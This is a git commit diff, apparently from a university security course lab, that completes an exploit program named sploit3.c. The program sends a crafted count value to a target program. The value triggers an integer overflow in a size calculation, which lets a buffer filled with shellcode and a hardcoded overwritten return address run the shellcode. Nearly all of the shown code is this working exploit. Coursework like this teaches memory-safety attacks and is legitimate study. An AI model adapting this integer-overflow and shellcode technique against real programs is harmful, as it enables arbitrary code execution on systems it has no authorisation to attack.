0d89cc7b2ede067c92478e72d6f87e8c03f0ca4e
Leo Martel <lmartel@stanford.edu>
2015-04-19 04:47:15 +0000

    sploit 3 done

--- proj1/sploits/sploit3.c
+++ proj1/sploits/sploit3.c
@@ -11,8 +11,22 @@ int main(void)
   char *args[3];
   char *env[1];
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
+  // c.to_signed < 0
+  // (c.to_signed * 20).to_unsigned = 20020
+  // where 20 == sizeof(widget)
+  char *count = "2147484649,";
+  
+  char sploit[11 + 20021];
+  memset(sploit, 0xff, sizeof sploit);
+  memcpy(sploit, count, 11);
+  memcpy(sploit + 11, shellcode, sizeof shellcode - 1);
+  int *eip = (int *) (sploit + 11 + 20004);
+  *eip = 0xbfffb1c5;
+  sploit[20020] = '\0';
+
+  args[0] = TARGET; args[1] = sploit; args[2] = NULL;
   env[0] = NULL;
+  
 
   if (0 > execve(TARGET, args, env))
     fprintf(stderr, "execve failed.\n");
